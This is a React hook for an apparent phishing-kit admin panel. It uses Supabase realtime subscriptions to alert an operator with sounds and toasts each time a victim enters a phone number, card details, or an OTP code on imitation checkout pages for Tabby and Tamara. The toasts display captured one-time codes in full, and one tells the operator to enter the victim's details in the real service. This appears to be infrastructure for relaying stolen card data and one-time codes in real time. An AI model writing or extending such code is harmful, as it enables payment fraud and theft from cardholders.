import { useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';

export const useAdminNotifications = () => {
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const paymentAudioRef = useRef<HTMLAudioElement | null>(null);
  const cardInfoAudioRef = useRef<HTMLAudioElement | null>(null);
  const otpAudioRef = useRef<HTMLAudioElement | null>(null);
  const location = useLocation();

  useEffect(() => {
    // فقط في صفحات الأدمن
    const isAdminPage = location.pathname.startsWith('/admin');
    if (!isAdminPage) {
      return;
    }

    // إنشاء عنصر الصوت للطلبات الجديدة
    audioRef.current = new Audio('/customer-info-notification.mp3');
    audioRef.current.volume = 0.7;
    audioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لصفحة الدفع
    paymentAudioRef.current = new Audio('/payment-page-notification.mp3');
    paymentAudioRef.current.volume = 0.7;
    paymentAudioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لإدخال بيانات البطاقة
    cardInfoAudioRef.current = new Audio('/card-info-notification.mp3');
    cardInfoAudioRef.current.volume = 0.7;
    cardInfoAudioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لإدخال OTP
    otpAudioRef.current = new Audio('/otp-notification.mp3');
    otpAudioRef.current.volume = 0.7;
    otpAudioRef.current.preload = 'auto';

    // الاستماع للطلبات الجديدة
    const ordersChannel = supabase
      .channel('admin-orders-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'customer_orders'
        },
        (payload) => {
          console.log('🔔 طلب جديد! تشغيل الصوت...', payload.new);
          playNotificationSound();
          toast.success('طلب جديد!', {
            description: `تم استلام طلب جديد من ${payload.new.owner_name || 'عميل'}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لدفعات تمارة الجديدة (إدخال رقم الهاتف)
    const tamaraChannel = supabase
      .channel('admin-tamara-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tamara_payments'
        },
        (payload) => {
          console.log('🔔 عميل جديد أدخل بياناته في تمارة!', payload.new);
          playNotificationSound();
          toast.info('📱 عميل جديد في تمارة - أدخل بياناته!', {
            description: `الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount || '0'} ر.س`,
            duration: 15000,
          });
        }
      )
      .subscribe();

    // الاستماع لدفعات تابي الجديدة (إدخال رقم الهاتف)
    const tabbyChannel = supabase
      .channel('admin-tabby-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_payments'
        },
        (payload) => {
          console.log('🔔 عميل جديد أدخل رقمه في تابي!', payload.new);
          playNotificationSound();
          toast.info('📱 عميل جديد في تابي - أدخل رقم هاتفه!', {
            description: `الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount || '0'} ر.س`,
            duration: 15000,
          });
        }
      )
      .subscribe();

    // الاستماع لدخول العملاء لصفحة الدفع
    const paymentPageChannel = supabase
      .channel('admin-payment-page-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'visitor_events'
        },
        (payload) => {
          if (payload.new.event_type === 'payment_page_visit') {
            playPaymentPageSound();
            toast.info('عميل وصل لصفحة الدفع!', {
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
              duration: 5000,
            });
          }
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - الصفحة الرئيسية
    const mainPaymentAttemptsChannel = supabase
      .channel('admin-main-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast.warning('عميل أدخل بيانات بطاقة!', {
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - تابي
    const tabbyPaymentAttemptsChannel = supabase
      .channel('admin-tabby-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast.warning('عميل أدخل بيانات بطاقة في تابي!', {
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - تمارة
    const tamaraPaymentAttemptsChannel = supabase
      .channel('admin-tamara-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tamara_payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast.warning('عميل أدخل بيانات بطاقة في تمارة!', {
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لوصول العملاء لصفحة OTP - تابي وتمارة
    const otpPageVisitChannel = supabase
      .channel('admin-otp-page-visits')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'visitor_events'
        },
        (payload) => {
          if (payload.new.event_type === 'tabby_otp_page_visit') {
            playOtpSound();
            toast.info('عميل وصل لصفحة التحقق في تابي!', {
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
              duration: 5000,
            });
          } else if (payload.new.event_type === 'tamara_otp_page_visit') {
            playOtpSound();
            toast.info('عميل وصل لصفحة التحقق في تمارة!', {
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
              duration: 5000,
            });
          }
        }
      )
      .subscribe();

    // الاستماع لإدخال OTP - الصفحة الرئيسية
    const mainOtpAttemptsChannel = supabase
      .channel('admin-main-otp-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'otp_attempts'
        },
        (payload) => {
          console.log('🔔 عميل أدخل OTP!', payload.new);
          playOtpSound();
          toast.success('عميل أدخل رمز التحقق OTP!', {
            description: `الكود: ${payload.new.otp_code}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال OTP - تابي
    const tabbyOtpAttemptsChannel = supabase
      .channel('admin-tabby-otp-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_otp_attempts'
        },
        (payload) => {
          console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
          playOtpSound();
          toast.success('عميل أدخل رمز التحقق في تابي!', {
            description: `الكود: ${payload.new.otp_code}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال OTP - تمارة
    const tamaraOtpAttemptsChannel = supabase
      .channel('admin-tamara-otp-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tamara_otp_attempts'
        },
        (payload) => {
          console.log('🔔 عميل أدخل OTP في تمارة!', payload.new);
          playOtpSound();
          toast.success('عميل أدخل رمز التحقق في تمارة!', {
            description: `الكود: ${payload.new.otp_code}`,
            duration: 5000,
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(ordersChannel);
      supabase.removeChannel(tamaraChannel);
      supabase.removeChannel(tabbyChannel);
      supabase.removeChannel(paymentPageChannel);
      supabase.removeChannel(mainPaymentAttemptsChannel);
      supabase.removeChannel(tabbyPaymentAttemptsChannel);
      supabase.removeChannel(tamaraPaymentAttemptsChannel);
      supabase.removeChannel(otpPageVisitChannel);
      supabase.removeChannel(mainOtpAttemptsChannel);
      supabase.removeChannel(tabbyOtpAttemptsChannel);
      supabase.removeChannel(tamaraOtpAttemptsChannel);
    };
  }, [location.pathname]);

  const playNotificationSound = () => {
    if (audioRef.current) {
      audioRef.current.currentTime = 0;
      console.log('🔊 محاولة تشغيل صوت معلومات العميل...');
      audioRef.current.play()
        .then(() => console.log('✅ تم تشغيل صوت معلومات العميل بنجاح'))
        .catch((error) => {
          console.error('❌ خطأ في تشغيل صوت معلومات العميل:', error);
          toast.error('فشل تشغيل الصوت', {
            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
          });
        });
    }
  };

  const playPaymentPageSound = () => {
    if (paymentAudioRef.current) {
      paymentAudioRef.current.currentTime = 0;
      paymentAudioRef.current.play().catch((error) => {
        console.error('Error playing payment page notification sound:', error);
      });
    }
  };

  const playCardInfoSound = () => {
    if (cardInfoAudioRef.current) {
      cardInfoAudioRef.current.currentTime = 0;
      console.log('🔊 محاولة تشغيل صوت بيانات البطاقة...');
      cardInfoAudioRef.current.play()
        .then(() => console.log('✅ تم تشغيل صوت بيانات البطاقة بنجاح'))
        .catch((error) => {
          console.error('❌ خطأ في تشغيل صوت بيانات البطاقة:', error);
          toast.error('فشل تشغيل الصوت', {
            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
          });
        });
    }
  };

  const playOtpSound = () => {
    if (otpAudioRef.current) {
      otpAudioRef.current.currentTime = 0;
      console.log('🔊 محاولة تشغيل صوت OTP...');
      otpAudioRef.current.play()
        .then(() => console.log('✅ تم تشغيل صوت OTP بنجاح'))
        .catch((error) => {
          console.error('❌ خطأ في تشغيل صوت OTP:', error);
          toast.error('فشل تشغيل الصوت', {
            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
          });
        });
    }
  };

  return null;
};
